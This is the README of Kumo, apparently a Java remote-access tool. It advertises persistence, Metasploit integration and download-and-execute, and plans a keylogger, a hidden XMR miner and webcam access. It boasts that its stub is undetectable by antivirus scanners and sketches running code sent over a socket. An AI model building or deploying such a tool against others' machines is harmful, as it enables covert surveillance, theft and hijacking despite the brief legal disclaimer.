## ![icon](https://github.com/cbrnrd/Kumo/blob/master/src/main/resources/Images/Icons/icon.png?raw=true)
Kumo

Kumo is a lightweight and portable remote administrative tool written in Java. It can be used on Windows, macOS, or Linux as long as they have the JRE installed.

## Features

* Send commands to client
* Cross platform (more or less)
* Clean, simple, and modern UI
* Easy client building process
* Customizable server and client settings
* Persistence (Windows)

## In progress
These features will likely be released in the order they are in below:

* ~~System information~~ ✔
* ~~Clipboard control~~ ✔
* ~~Visit website~~ ✔
* ~~Show messagebox~~ ✔
* ~~Metasploit integration~~ ✔
* Upload/~~download~~ ✔ and execute
* Linux/Mac persistence
* Remote desktop
* Keylogger
* XMR miner
* Webcam stuff
* Process viewer/killer
* ~~Plugin execution (see below)~~ ✔

## Idea for plugin execution
```java
class ModuleName implements Runnable {

  public void run(){
    // Execute custom module code
  }

}
```
1. `import Kumo.modules.*;
2. Send `Runnable` object over socket to client
3. Client side: 
```java
Runnable readObject = (Runnable) objectInputStream.readObject();
readObject.run();
```

## Spyralscan
FUD

https://spyralscanner.net/result.php?id=T8mIT5BmEc

![scan](https://spyralscanner.net/imgshr/index.php?id=T8mIT5BmEc)

## Stub
9kb stub - cross-platform


## Legal
Kumo is not to be used without permission or ownership of the systems Kumo is installed on. Kumo is a remote administrative tool to aid in the control and management of systems alongside IT setups. Any other use is prohibited. Kumo is not liable for system damage or unauthorised use.

